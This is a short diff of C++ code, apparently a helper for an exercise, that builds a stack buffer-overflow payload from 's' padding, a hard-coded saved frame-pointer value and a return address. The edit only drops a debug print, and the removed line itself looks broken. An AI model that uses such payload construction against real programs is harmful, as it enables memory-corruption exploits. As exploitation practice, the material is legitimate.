@@ -30,7 +30,7 @@ string * getSolution(unsigned int addr){
 	int filler = stoi(input, NULL, 10);
 	input = "";
 	char rbp[] = {'\176', '\232', '\255', '\255', '\255', '\127', '\000', '\000'};
-	cout << "Filler length = " << dec << filler << "\nrbp=" << hex << *((unsigned int *) rbp) << *((unsigned int) &rbp[4]) << "\nAddr = " << hex << addr << endl;
+	cout << "Filler length = " << dec << filler << "\nAddr = " << hex << addr << endl;
 	char char_arr[filler+12];
 	for(int i=0; i<filler; i++){
 		char_arr[i] = 's';
